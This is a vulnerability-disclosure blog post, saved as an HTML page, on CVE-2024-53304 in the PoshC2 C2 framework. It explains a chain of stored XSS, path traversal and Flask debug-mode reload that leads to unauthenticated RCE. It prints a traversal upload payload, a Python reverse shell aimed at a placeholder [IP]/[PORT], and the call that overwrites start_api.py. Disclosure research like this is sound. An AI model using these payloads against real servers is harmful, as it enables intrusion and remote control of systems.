@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang=en>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="Unauthenticated RCE in PoshC2">
+<meta property="og:type" content="article">
+<meta property="og:title" content="PoshC2 RCE - CVE-2024-53304">
+<meta property="og:url" content="http://example.com/2024/10/28/poshc2-rce/index.html">
+<meta property="og:site_name" content="fern&#39;s blog">
+<meta property="og:description" content="Unauthenticated RCE in PoshC2">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/media/poshc2/lfi.png">
+<meta property="article:published_time" content="2024-10-28T04:35:37.000Z">
+<meta property="article:modified_time" content="2025-09-16T14:55:37.796Z">
+<meta property="article:author" content="fern">
+<meta property="article:tag" content="vuln-research">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/media/poshc2/lfi.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/favicon.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/android-chrome-192x192.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
+        
+      
+    
+    <!-- title -->
+    <title>PoshC2 RCE - CVE-2024-53304</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+	<!-- mathjax -->
+	
+		<script type="text/x-mathjax-config">
+		  MathJax.Hub.Config({
+			tex2jax: {
+			  skipTags: ['script', 'noscript', 'style', 'textarea', 'pre'],
+			  inlineMath: [['$','$']]
+			}
+		  });
+		</script>
+		<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/latest.js?config=TeX-MML-AM_CHTML' async></script>
+	
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/hexo-math@4.0.0/dist/style.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 7.3.0"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="Previous post" href="/2024/11/01/whoogle-rce/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">Previous post</span>
+      <span id="i-next" class="info" style="display:none;">Next post</span>
+      <span id="i-top" class="info" style="display:none;">Back to top</span>
+      <span id="i-share" class="info" style="display:none;">Share post</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/28/poshc2-rce/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/28/poshc2-rce/&text=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/28/poshc2-rce/&is_video=false&description=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PoshC2 RCE - CVE-2024-53304&body=Check out this article: http://example.com/2024/10/28/poshc2-rce/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/28/poshc2-rce/&name=PoshC2 RCE - CVE-2024-53304&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/28/poshc2-rce/&t=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">2.</span> <span class="toc-text">Stored XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-to-arbitrary-file-write"><span class="toc-number">3.</span> <span class="toc-text">XSS to arbitrary file write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-file-write-to-RCE"><span class="toc-number">4.</span> <span class="toc-text">Arbitrary file write to RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Disclosure"><span class="toc-number">6.</span> <span class="toc-text">Disclosure</span></a></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        PoshC2 RCE - CVE-2024-53304
+    </h1>
+
+
+
+    <div class="meta">
+      fern
+      
+    <div class="postdate">
+      
+        <time datetime="2024-10-28T04:35:37.000Z" class="dt-published" itemprop="datePublished">2024-10-28</time>
+        
+      
+    </div>
+
+
+      
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/vuln-research/" rel="tag">vuln-research</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>PoC: <a target="_blank" rel="noopener" href="https://gist.github.com/fern89/3464e8428d7675e4f0f390a6b2b2842e">https://gist.github.com/fern89/3464e8428d7675e4f0f390a6b2b2842e</a></p>
+<video width='100%' height='250px' controls><source src='/media/poshc2/demo.mp4 ' type=video/webm> Your browser does not support the webm tag.</video>
+
+<h2 id="Background"><a href="#Background" class="headerlink" title="Background"></a>Background</h2><p><a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2">PoshC2</a> is an open-source proxy aware C2 framework used to aid red teamers with post-exploitation and lateral movement, with over 1.8k stars on GitHub, <a target="_blank" rel="noopener" href="https://attack.mitre.org/software/S0378/">a page on MITRE</a>, and being abused by groups <a target="_blank" rel="noopener" href="https://attack.mitre.org/groups/G0064">APT33</a> and <a target="_blank" rel="noopener" href="https://attack.mitre.org/groups/G1001">HEXANE</a>. I have discovered a stored XSS within the control panel, along with a path traversal vulnerability, that effectively allows an unauthenticated attacker to gain <strong>RCE</strong> on the server running the framework.</p>
+<h2 id="Stored-XSS"><a href="#Stored-XSS" class="headerlink" title="Stored XSS"></a>Stored XSS</h2><p>Combing through the code, we find a very odd looking line at <a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2/blob/master/resources/html-templates/c2view.html#L51">line 51 in resources&#x2F;html-templates&#x2F;c2view.html</a>.</p>
+<figure class="highlight jinja"><figcaption><span>resources/html-templates/c2view.html</span></figcaption><table><tr><td class="gutter"><pre><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="template-tag">&#123;% <span class="name"><span class="name">autoescape</span></span> false %&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-variable">&#123;&#123; task.output | replace(&quot;\n\n&quot;,&quot;&lt;br /&gt;&quot;) | replace(&quot;\n&quot;,&quot;&lt;br /&gt;&quot;)&#125;&#125;</span><span class="language-xml"></span></span><br><span class="line"><span class="language-xml"></span><span class="template-tag">&#123;% <span class="name"><span class="name">endautoescape</span></span> %&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+<p>Importantly, pay attention to the `{% autoescape false %}`. Note that by default, Flask will autoescape all inputs in Jinja2 templates. I understand that the developers likely did this to prevent <code>&lt;br /&gt;</code> from being escaped as well, but this leads to a critical <strong>XSS vulnerability</strong>, as the <code>task.output</code> variable is not manually escaped beforehand. As such, by posing as a client, and sending a malicious response to any task issued, we effectively gain the arbitrary JavaScript execution on the operator’s browser! Unfortunately, this is <strong>not</strong> a zero-interaction exploit, as we still need the operator to attempt to run a command on the victim (even <code>help</code> is sufficient), but realistically, this will nearly always happen.</p>
+<video width='100%' height='250px' controls><source src='/media/poshc2/xss.mp4 ' type=video/webm> Your browser does not support the webm tag.</video>
+
+<p>Now, the code to act as a client, and send a malicious response, is rather complicated, due to the large amounts of encryption being used. As such, for purpose of brevity, I will omit the code, from this blog post, if you are interested, check out the PoC linked above.</p>
+<h2 id="XSS-to-arbitrary-file-write"><a href="#XSS-to-arbitrary-file-write" class="headerlink" title="XSS to arbitrary file write"></a>XSS to arbitrary file write</h2><p>Now, an XSS on its own is already pretty darn powerful for a C2 control panel, as we can effectively steal all connected clients without need for any further exploit. But I would like to go further, and get the holy grail of RCE on the server. So we will continue on to our next vulnerability in the chain, the <strong>path traversal</strong>.</p>
+<p>Let us take a look at the control panel. We can see a place for you to upload payloads:</p>
+<p><img src="/media/poshc2/lfi.png" alt="Image of a button that says Upload"></p>
+<p>Now, from experience, I wager a guess that a path traversal vulnerability is existent. Authenticated control panels tend to be notoriously insecure, and riddled with vulnerabilities. Lo and behold, there indeed is one here! Let us take a look at <a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2/blob/master/start_api.py#L326">line 326 of start_api.py</a>.</p>
+<figure class="highlight py"><figcaption><span>start_api.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">326</span><br></pre></td><td class="code"><pre><span class="line">file.save(os.path.join(PAYLOADS_DIR, file.filename))</span><br></pre></td></tr></table></figure>
+
+<p>Note that <code>os.path.join</code> is used, with no escaping whatsoever on <code>file.filename</code>. This gives us a path traversal, and hence arbitrary file write! Hence, we can combine this with the XSS, allowing for unauthenticated arbitrary file write!</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">myUpload</span>(<span class="params">text, uploadUrl, newFileName</span>) &#123;</span><br><span class="line">    <span class="keyword">var</span> formData = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">    formData.<span class="title function_">append</span>(<span class="string">&#x27;file&#x27;</span>, <span class="keyword">new</span> <span class="title class_">Blob</span>([text], &#123;<span class="attr">type</span>: <span class="string">&#x27;text/plain&#x27;</span>&#125;), newFileName);</span><br><span class="line">    <span class="title function_">fetch</span>(uploadUrl, &#123;</span><br><span class="line">        <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="attr">body</span>: formData</span><br><span class="line">    &#125;)</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">myUpload</span>(<span class="string">&#x27;data&#x27;</span>, <span class="string">&quot;/file/upload&quot;</span>, <span class="string">&quot;../../../../../../../../../test.txt&quot;</span>);</span><br></pre></td></tr></table></figure>
+<video width='100%' height='250px' controls><source src='/media/poshc2/lfi.mp4 ' type=video/webm> Your browser does not support the webm tag.</video>
+
+<h2 id="Arbitrary-file-write-to-RCE"><a href="#Arbitrary-file-write-to-RCE" class="headerlink" title="Arbitrary file write to RCE"></a>Arbitrary file write to RCE</h2><p>Finally, time for the RCE. There are a great many ways to do this, since the service seems to run by default as root, but by far the easiest, is to abuse Flask.</p>
+<p>Let us take a look at <a target="_blank" rel="noopener" href="https://github.com/nettitude/PoshC2/blob/master/start_api.py#L543">line 543 in start_api.py</a>. We note that by default, the webserver is running in debug mode. Now, this on its own isn’t a vulnerability per se, but it surely is pretty bad practice (as it is very likely nearly all the users of this software are insufficiently knowledgeable about security to know why switching to a production server is a very good idea). If there is an LFI somewhere, it is relatively trivial to obtain RCE as well via <a target="_blank" rel="noopener" href="https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/werkzeug">Werkzeug PIN reversing</a>.</p>
+<p>Back on topic, why am I pointing this out? Well, another interesting quirk of Flask debug mode, is that it is constantly polling for changes to the .py files, and restarting them whenever that happens! This is great for developers, who just want to hit Ctrl+S and refresh the webpage, and also great for us, as now we have a quick, easy, and most importantly consistent, target to override, with code that will be giving us a reverse shell! We will be overriding the <code>start_api.py</code>{: .filepath} file, found in <code>/opt/PoshC2/start_api.py</code>{: .filepath}.</p>
+<p>Let’s generate a Python reverse shell from <a target="_blank" rel="noopener" href="https://www.revshells.com/">revshells.com</a>,</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os,pty,socket;s=socket.socket();</span><br><span class="line">s.connect(([IP], [PORT]));[os.dup2(s.fileno(),f)<span class="keyword">for</span> f <span class="keyword">in</span>(<span class="number">0</span>,<span class="number">1</span>,<span class="number">2</span>)];</span><br><span class="line">pty.spawn(<span class="string">&quot;/bin/bash&quot;</span>)</span><br></pre></td></tr></table></figure>
+<p>We call this code from the XSS:</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">myUpload</span>(<span class="string">&#x27;[REVSHELL]&#x27;</span>,<span class="string">&quot;/file/upload&quot;</span>,<span class="string">&quot;../../../../../opt/PoshC2/start_api.py&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>Now, when the XSS payload is called, the arbitrary file override is triggered, Flask sees the Python file changing, and restarts it, giving us our RCE! Great success!</p>
+<h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>By chaining these 2 vulnerabilities together, we managed to gain unauthenticated RCE, requiring minimal user interaction. Here is the entire chain in action once more.</p>
+<video width='100%' height='250px' controls><source src='/media/poshc2/demo.mp4 ' type=video/webm> Your browser does not support the webm tag.</video>
+
+<p>Once again, here is the <a target="_blank" rel="noopener" href="https://gist.github.com/fern89/3464e8428d7675e4f0f390a6b2b2842e">PoC</a>.</p>
+<h2 id="Disclosure"><a href="#Disclosure" class="headerlink" title="Disclosure"></a>Disclosure</h2><p>2024-10-27 - Found and reported vulnerability to Nettitude Labs</p>
+
+  </div>
+</article>
+
+
+
+        
+          <div id="footer-post-container">
+  <div id="footer-post">
+
+    <div id="nav-footer" style="display: none">
+      <ul>
+        
+          <li><a href="/">Home</a></li>
+        
+          <li><a href="/about/">About</a></li>
+        
+          <li><a href="/archives/">Writing</a></li>
+        
+      </ul>
+    </div>
+
+    
+    
+      <div id="toc-footer" style="display: none">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Background"><span class="toc-number">1.</span> <span class="toc-text">Background</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Stored-XSS"><span class="toc-number">2.</span> <span class="toc-text">Stored XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XSS-to-arbitrary-file-write"><span class="toc-number">3.</span> <span class="toc-text">XSS to arbitrary file write</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Arbitrary-file-write-to-RCE"><span class="toc-number">4.</span> <span class="toc-text">Arbitrary file write to RCE</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Conclusion"><span class="toc-number">5.</span> <span class="toc-text">Conclusion</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Disclosure"><span class="toc-number">6.</span> <span class="toc-text">Disclosure</span></a></li></ol>
+      </div>
+    
+
+    <div id="share-footer" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=http://example.com/2024/10/28/poshc2-rce/"><i class="fab fa-facebook fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=http://example.com/2024/10/28/poshc2-rce/&text=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-twitter fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-linkedin fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=http://example.com/2024/10/28/poshc2-rce/&is_video=false&description=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-pinterest fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=PoshC2 RCE - CVE-2024-53304&body=Check out this article: http://example.com/2024/10/28/poshc2-rce/"><i class="fa-solid fa-envelope fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-get-pocket fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-reddit fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-stumbleupon fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=http://example.com/2024/10/28/poshc2-rce/&title=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-digg fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=http://example.com/2024/10/28/poshc2-rce/&name=PoshC2 RCE - CVE-2024-53304&description="><i class="fab fa-tumblr fa-lg" aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=http://example.com/2024/10/28/poshc2-rce/&t=PoshC2 RCE - CVE-2024-53304"><i class="fab fa-hacker-news fa-lg" aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+
+    <div id="actions-footer">
+        <a id="menu" class="icon" href="#" onclick="$('#nav-footer').toggle();return false;"><i class="fa-solid fa-bars fa-lg" aria-hidden="true"></i> Menu</a>
+        
+          <a id="toc" class="icon" href="#" onclick="$('#toc-footer').toggle();return false;"><i class="fa-solid fa-list fa-lg" aria-hidden="true"></i> TOC</a>
+        
+        <a id="share" class="icon" href="#" onclick="$('#share-footer').toggle();return false;"><i class="fa-solid fa-share-alt fa-lg" aria-hidden="true"></i> Share</a>
+        <a id="top" style="display:none" class="icon" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up fa-lg" aria-hidden="true"></i> Top</a>
+    </div>
+
+  </div>
+</div>
+
+        
+        <footer id="footer">
+  <div class="footer-left">
+    Copyright &copy;
+    
+    
+    2024-2025
+    fern
+  </div>
+  <div class="footer-right">
+    <nav>
+      <ul>
+        <!--
+       --><li><a href="/">Home</a></li><!--
+     --><!--
+       --><li><a href="/about/">About</a></li><!--
+     --><!--
+       --><li><a href="/archives/">Writing</a></li><!--
+     -->
+      </ul>
+    </nav>
+  </div>
+</footer>
+
+    </div>
+    <!-- styles -->
+
+
+
+  <link rel="preload" as="style" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" crossorigin="anonymous" onload="this.onload=null;this.rel='stylesheet'"/>
+
+
+    <!-- jquery -->
+
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js" crossorigin="anonymous"></script>
+
+
+
+
+<!-- clipboard -->
+
+  
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.7/clipboard.min.js" crossorigin="anonymous"></script>
+  
+  <script type="text/javascript">
+  $(function() {
+    // copy-btn HTML
+    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
+    btn += '<i class="fa-regular fa-clone"></i>';
+    btn += '</span>';
+    // mount it!
+    $(".highlight table").before(btn);
+    var clip = new ClipboardJS('.btn-copy', {
+      text: function(trigger) {
+        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
+      }
+    });
+    clip.on('success', function(e) {
+      e.trigger.setAttribute('aria-label', "Copied!");
+      e.clearSelection();
+    })
+  })
+  </script>
+
+
+<script src="/js/main.js"></script>
+
+<!-- search -->
+
+<!-- Baidu Analytics -->
+
+<!-- Cloudflare Analytics -->
+
+  <script defer src='https://static.cloudflareinsights.com/beacon.min.js' data-cf-beacon='{"token": "e2c0a56b5d4d466baf300058fd41c3e8"}'></script>
+
+<!-- Disqus Comments -->
+
+<!-- utterances Comments -->
+
+</body>
+</html>
